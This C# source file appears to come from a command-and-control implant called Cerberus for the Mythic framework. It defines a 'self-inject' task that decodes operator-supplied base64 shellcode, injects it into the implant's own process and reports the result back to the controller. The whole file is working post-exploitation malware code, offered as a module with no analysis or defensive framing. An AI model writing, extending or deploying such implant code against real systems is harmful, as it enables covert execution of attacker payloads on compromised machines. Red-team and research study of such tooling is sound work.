using Injection;
using Models.Tasks;
using Extend;
using System.Text;
using System;

namespace Tasks.Commands
{
    public class SelfInject : CerberusCommand
    {
        public override string Name => "self-inject";

        public override MythicTaskResult Execute(MythicTask task)
        {
            // [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""))

            var arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<SelfInjectParam>();
            MythicTaskResult result;

            var FileBytes = Convert.FromBase64String(arguments.file);

            var injector = new SelfInjector();
            var success = injector.Inject(FileBytes);

            if (success)
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Shellcode injected",
                    completed = true,
                    status = "success",
                };
            }
            else
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Failed to inject shellcode",
                    completed = true,
                    status = "Error",
                    error = "Failed to inject shellcode"
                };
            }

            return result;
        }

        public class SelfInjectParam
        {
            public string file { get; set; }
        }
    }
}
